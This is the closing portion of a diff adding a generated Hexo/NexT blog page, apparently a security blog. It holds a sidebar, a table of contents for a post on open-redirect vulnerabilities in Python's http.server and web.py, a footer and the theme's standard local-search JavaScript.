+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/demossl" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:demosqq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师导航" target="_blank">渗透师导航</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.asold.xyz" title="Aaron" target="_blank">Aaron</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com" title="Damit5" target="_blank">Damit5</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://coco413.com/SecNavi/" title="SecNavi" target="_blank">SecNavi</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#python-http-server-web-py-URL跳转漏洞实践"><span class="nav-number">1.</span> <span class="nav-text">python: http.server / web.py URL跳转漏洞实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-SERVER"><span class="nav-number">1.1.</span> <span class="nav-text">HTTP.SERVER</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-py框架"><span class="nav-number">1.2.</span> <span class="nav-text">web.py框架</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自动化检测"><span class="nav-number">1.3.</span> <span class="nav-text">自动化检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.4.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">1.4.1.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demos</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共56.2k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
